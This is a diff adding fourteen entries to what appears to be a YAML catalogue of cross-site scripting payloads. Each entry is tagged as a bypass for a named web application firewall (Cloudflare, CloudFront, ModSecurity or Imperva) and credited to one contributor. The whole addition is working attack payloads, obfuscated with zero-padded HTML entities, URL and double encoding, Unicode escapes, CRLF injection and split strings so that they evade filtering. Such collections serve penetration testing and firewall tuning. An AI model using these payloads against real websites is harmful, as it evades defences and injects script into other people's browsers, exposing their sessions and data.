@@ -10448,4 +10448,158 @@ payloads:
     browsers: ["All"]
     date_added: "07-01-2026"
 
+  - code: |
+      <svg onload=alert&#0000000040document.cookie)>
+    description: "CloudFlare WAF bypass using zero-padded HTML entity for parenthesis"
+    category: "waf"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["cloudflare", "svg", "onload", "html-entity", "zero-padding", "waf-bypass"]
+    browsers: ["All"]
+    date_added: "07-01-2026"
+
+  - code: |
+      <svg/oNLY%3d1/**/On+ONLoaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>
+    description: "CloudFlare WAF bypass with mixed case, URL encoding and Unicode escapes"
+    category: "waf"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["cloudflare", "svg", "mixed-case", "url-encoding", "unicode-escape", "waf-bypass"]
+    browsers: ["All"]
+    date_added: "07-01-2026"
+
+  - code: |
+      <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NLZCA6KQ=="))>
+    description: "CloudFlare WAF bypass using base64 encoded message with atob"
+    category: "waf"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["cloudflare", "svg", "base64", "atob", "mixed-case", "waf-bypass"]
+    browsers: ["All"]
+    date_added: "07-01-2026"
+
+  - code: |
+      <details/open/ontoggle=confirm('XSS')>
+    description: "CloudFront WAF bypass using details element with ontoggle event"
+    category: "waf"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["cloudfront", "details", "ontoggle", "open", "waf-bypass"]
+    browsers: ["Chrome", "Firefox", "Edge"]
+    date_added: "07-01-2026"
+
+  - code: |
+      6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/
+    description: "CloudFront WAF bypass with URL encoded SVG injection"
+    category: "waf"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["cloudfront", "svg", "url-encoding", "injection", "waf-bypass"]
+    browsers: ["All"]
+    date_added: "07-01-2026"
+
+  - code: |
+      ;window/*aabb*/['al'%2b'ert'](document./*aabb*/Location);
+    description: "CloudFront WAF bypass using comment obfuscation and string concatenation"
+    category: "waf"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["cloudfront", "comment-obfuscation", "string-concatenation", "window", "waf-bypass"]
+    browsers: ["All"]
+    date_added: "07-01-2026"
+
+  - code: |
+      ">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(cloudfrontbypass)//>
+    description: "CloudFront WAF bypass with CRLF injection and malformed attributes"
+    category: "waf"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["cloudfront", "crlf-injection", "malformed-attributes", "img", "waf-bypass"]
+    browsers: ["All"]
+    date_added: "07-01-2026"
+
+  - code: |
+      <svg onload='new Function*["Y000!"].find(al\u0065rt)*'>
+    description: "ModSecurity WAF bypass using Function constructor with array find method"
+    category: "waf"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["modsecurity", "svg", "function-constructor", "array-find", "unicode-escape", "waf-bypass"]
+    browsers: ["All"]
+    date_added: "07-01-2026"
+
+  - code: |
+      <details x=xxxXxXXXXXXXXXXXXXXXXXXXXXXXXKXXXXXXXXXXX 2 Open ontoggle=k&#x0000000000061;alert&#x000000028;origin&#x000029;>
+    description: "Imperva WAF bypass with long attribute value and zero-padded hex entities"
+    category: "waf"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["imperva", "details", "long-attributes", "hex-entity", "zero-padding", "waf-bypass"]
+    browsers: ["Chrome", "Firefox", "Edge"]
+    date_added: "07-01-2026"
+
+  - code: |
+      "><A%20%252F=""Href=%20JavaScript:k=%27a%27,top[k%2B%27lert%27](origin)>
+    description: "Imperva WAF bypass with double URL encoding and string concatenation"
+    category: "waf"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["imperva", "anchor", "double-encoding", "javascript", "string-concatenation", "waf-bypass"]
+    browsers: ["All"]
+    date_added: "07-01-2026"
+
+  - code: |
+      <dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
+    description: "Imperva WAF bypass with mixed case details and line feed characters"
+    category: "waf"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["imperva", "details", "mixed-case", "line-feed", "variable-assignment", "waf-bypass"]
+    browsers: ["Chrome", "Firefox", "Edge"]
+    date_added: "07-01-2026"
+
+  - code: |
+      `'";//><img/src=x onError="${x};alert(`1`);">
+    description: "Imperva WAF bypass using template literals and variable substitution"
+    category: "waf"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["imperva", "template-literals", "variable-substitution", "img", "onerror", "waf-bypass"]
+    browsers: ["All"]
+    date_added: "07-01-2026"
+
+  - code: |
+      `'";//><Img Src=a OnError=location=src>
+    description: "Imperva WAF bypass with location redirection via img src attribute"
+    category: "waf"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["imperva", "img", "location-redirect", "mixed-case", "waf-bypass"]
+    browsers: ["All"]
+    date_added: "07-01-2026"
+
+  - code: |
+      `'";//></h1><Svg+Only%3d1+OnLoad%3dconfirm(atob("WW91IGhhdmUgYmVlbiBoYWNrZWQgYnkgb3R0ZXJseSE%3d"))>
+    description: "Imperva WAF bypass with SVG base64 payload and URL encoding"
+    category: "waf"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["imperva", "svg", "base64", "atob", "url-encoding", "mixed-case", "waf-bypass"]
+    browsers: ["All"]
+    date_added: "07-01-2026"
+
 
